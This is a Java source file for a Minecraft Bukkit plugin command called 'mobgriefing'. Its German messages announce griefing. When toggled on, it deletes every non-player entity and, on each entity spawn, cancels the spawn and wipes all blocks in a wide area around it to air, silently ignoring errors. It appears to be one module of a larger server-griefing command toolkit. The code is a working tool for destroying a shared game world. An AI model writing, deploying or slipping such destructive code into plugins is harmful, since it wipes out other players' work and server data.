package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntitySpawnEvent;

public class Command_MobGriefing extends CommandBase implements Listener {

    private boolean enabled = false;

    public Command_MobGriefing() {
        super("mobgriefing", "-", Category.WORLD);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        try {
            if (!this.enabled) {
                this.enabled = true;
                p.sendMessage(Start.INSTANCE.chatPrefix + "Jetzt wird gegrieft!");

                for (Entity en : p.getWorld().getEntities()) {
                    if (!(en instanceof Player)) {
                        en.remove();
                    }
                }
            } else {
                this.enabled = false;
                p.sendMessage(Start.INSTANCE.chatPrefix + "Jetzt wird nicht mehr gegrieft!");
            }
        } catch (Exception ignored) {
        }
    }

    @EventHandler
    public void onEntitySpawn(EntitySpawnEvent e) {
        if (this.enabled) {
            try {
                for (double x = e.getEntity().getLocation().getX() - 3.0D; x <= e.getEntity().getLocation().getX() + 3.0D; ++x) {
                    for (double y = e.getEntity().getLocation().getY() - 8.0D; y <= e.getEntity().getLocation().getY() + 8.0D; ++y) {
                        for (double z = e.getEntity().getLocation().getZ() - 3.0D; z <= e.getEntity().getLocation().getZ() + 3.0D; ++z) {
                            if (!(new Location(e.getEntity().getWorld(), x, y, z)).getBlock().getType().equals(Material.AIR)) {
                                (new Location(e.getEntity().getWorld(), x, y, z)).getBlock().setType(Material.AIR);
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }

            e.setCancelled(true);
        }
    }

}
